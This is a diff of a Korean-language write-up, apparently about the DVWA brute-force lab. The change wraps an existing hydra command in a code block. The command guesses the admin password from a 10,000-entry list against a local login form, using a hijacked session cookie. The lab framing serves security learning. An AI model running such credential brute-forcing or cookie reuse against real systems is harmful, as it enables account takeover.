@@ -99,7 +99,9 @@ if( isset( $_GET[ 'Login' ] ) ) {
 
 탈취한 쿠키값으로 검증을 거치지 않고 사용자로 위장하여 admin 계정의 패스워드가 나올 때 까지 하나씩 대입하여 공격을 시도해보았다.
 
-`hydra -l admin -P 10kpassword.txt 127.0.0.1 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=1kjidhie03fm37j915g8le23m5; security=low:F=Username and/or password incorrect'`
+```c
+hydra -l admin -P 10kpassword.txt 127.0.0.1 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=1kjidhie03fm37j915g8le23m5; security=low:F=Username and/or password incorrect'
+```
 
 ![이미지](/assets/hydra3.png)
 
